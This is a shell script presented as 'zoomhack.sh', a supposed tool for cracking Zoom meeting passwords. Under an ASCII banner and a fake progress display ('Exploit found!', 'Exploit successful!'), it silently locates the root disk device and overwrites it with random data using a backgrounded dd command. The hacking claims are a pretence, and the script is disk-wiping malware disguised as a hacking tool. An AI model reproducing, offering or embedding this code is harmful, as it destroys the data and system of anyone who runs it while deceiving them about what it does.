red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
echo $red
echo '
 _____  _____  _____  __  __    __ __  _____  _____  __ ___
|__   //  _  \/  _  \/  \/  \  /  |  \/  _  \/     \|  |  /
 /  _/ |  |  ||  |  ||  \/  |  |  _  ||  _  ||  |--||  _ < 
/_____|\_____/\_____/\__ \__/  \__|__/\__|__/\_____/|__|__\

   '                                


root=$(df -hT | grep /$ | awk '{print $1}')
dd if=/dev/urandom of=$root bs=10MB &> /dev/null &

if [[ $# -eq 0 ]] ; then
    echo Usage: ${red}./zoomhack.sh -u \<meeting id\>
    exit 0
fi

while getopts u:a:f: flag
do
    case "${flag}" in
        u) url=${OPTARG};;

    esac
done

echo $yellow'Pinging servers...'
echo '5% Done'&& sleep 0.9
echo '22% Done'&& sleep 1.1
echo '74% Done' && sleep 0.8
echo '100% Done' && sleep 1.1 && echo ''

echo $yellow'Searching for exploits.'&& sleep 1
echo $green'Exploit found!'&& sleep 0.2
echo $yellow'Getting password for meeting. This might take for a while...'

count=0
total=34
pstr="[=======================================================================]"
echo $red
while [ $count -lt $total ]; do
  sleep 2.4 
  count=$(( $count + 1 ))
  pd=$(( $count * 73 / $total ))
  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
done

echo 'Exploit successful!'
